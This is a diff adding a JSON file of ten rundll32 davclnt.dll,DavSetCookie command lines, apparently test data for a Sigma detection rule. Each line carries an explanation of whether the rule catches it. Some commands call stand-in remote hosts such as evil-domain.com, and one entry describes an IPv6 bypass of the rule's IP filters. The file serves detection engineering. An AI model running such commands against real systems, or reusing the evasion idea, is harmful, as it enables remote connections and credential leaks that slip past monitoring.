@@ -1,0 +1,42 @@
+[
+  {
+    "output": "rundll32.exe davclnt.dll,DavSetCookie http://203.0.113.5/share",
+    "explanation": "This command matches the Sigma rule's detection criteria. It uses rundll32.exe with the specified DLL and function, and includes a non-local IP address in the URL."
+  },
+  {
+    "output": "rundll32.exe davclnt.dll,DavSetCookie http://evil-domain.com/share",
+    "explanation": "This command matches the Sigma rule's detection criteria. It uses rundll32.exe with the specified DLL and function, and includes a domain name in the URL."
+  },
+  {
+    "output": "rundll32.exe davclnt.dll,DavSetCookie http://[2001:db8::1]/share",
+    "explanation": "This command attempts to bypass the rule by using an IPv6 address, which is not explicitly covered by the rule's IP filters. However, the rule's regex for URLs still matches the structure."
+  },
+  {
+    "output": "rundll32.exe davclnt.dll,DavSetCookie http://192.168.1.1/share",
+    "explanation": "This command is excluded by the rule's filter for local IP addresses and will not trigger the detection."
+  },
+  {
+    "output": "rundll32.exe davclnt.dll,DavSetCookie http://10.0.0.1/share",
+    "explanation": "This command is excluded by the rule's filter for local IP addresses and will not trigger the detection."
+  },
+  {
+    "output": "rundll32.exe \"C:\\Windows\\System32\\davclnt.dll\",DavSetCookie http://203.0.113.5/share",
+    "explanation": "This command uses quotes and an absolute path to the DLL, which are safe mutations. It still matches the Sigma rule's detection criteria."
+  },
+  {
+    "output": "rundll32.exe davclnt.dll,DavSetCookie http://203.0.113.5/share\\",
+    "explanation": "This command adds an extra backslash at the end of the URL path, which is a safe mutation. It still matches the Sigma rule's detection criteria."
+  },
+  {
+    "output": "rundll32.exe davclnt.dll,DavSetCookie http://203.0.113.5/share?query=1",
+    "explanation": "This command adds a query parameter to the URL, which is a safe mutation. It still matches the Sigma rule's detection criteria."
+  },
+  {
+    "output": "rundll32.exe davclnt.dll,DavSetCookie http://203.0.113.5/share#fragment",
+    "explanation": "This command adds a fragment identifier to the URL, which is a safe mutation. It still matches the Sigma rule's detection criteria."
+  },
+  {
+    "output": "rundll32.exe davclnt.dll,DavSetCookie http://203.0.113.5/share%20withspace",
+    "explanation": "This command encodes a space in the URL path, which is a safe mutation. It still matches the Sigma rule's detection criteria."
+  }
+]
